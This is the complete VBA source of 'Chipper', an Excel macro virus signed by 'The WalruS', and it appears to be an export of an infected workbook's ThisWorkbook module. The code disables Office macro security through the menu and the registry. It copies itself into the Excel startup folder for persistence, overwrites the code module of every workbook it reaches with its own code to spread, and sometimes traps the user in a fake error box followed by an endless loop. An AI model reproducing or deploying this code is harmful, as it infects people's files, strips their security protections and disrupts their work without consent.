   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   '
   Private Sub Workbook_Deactivate()

   ' Chipper By The WalruS
   ' v1.00 09/00

       On Error Resume Next

       With Application
           .DisplayAlerts = 0
           .ScreenUpdating = 0
           .DisplayStatusBar = 0
           .UserName = "The WalruS"
       End With

       CommandBars("Macro").Controls("Security...").Enabled = False
       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

       Installed = Dir(Application.StartupPath & "\Book1.")
       If Installed = "" Then
           VBAProject.ThisWorkbook.SaveAs Filename:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
       End If

       Set ActiveWB = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
       Set ThisWB = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule

       If ActiveWB.Lines(1, 1) <> "'" Then
           ActiveWB.DeleteLines 1, ActiveWB.CountofLines
           ActiveWB.InsertLines 1, ThisWB.Lines(1, ThisWB.CountofLines)
           Application.Caption = "Time For Chipper To Move On!"

           With ActiveWorkbook
               .Title = "Chipper"
               .Author = "The WalruS"
           End With

           ActiveWorkbook.Save
       End If

       If Second(Now) > 58 Then
           MsgBox "Shutdown Error On Previous Close", vbCritical, "Chipper"
           Do
           DoEvents
           Randomize
               If Int(Rnd * 10000) = 2 Then
                   Application.WindowState = xlMinimized
                   Application.WindowState = xlMaximized
               End If
           Loop
       End If
   End Sub
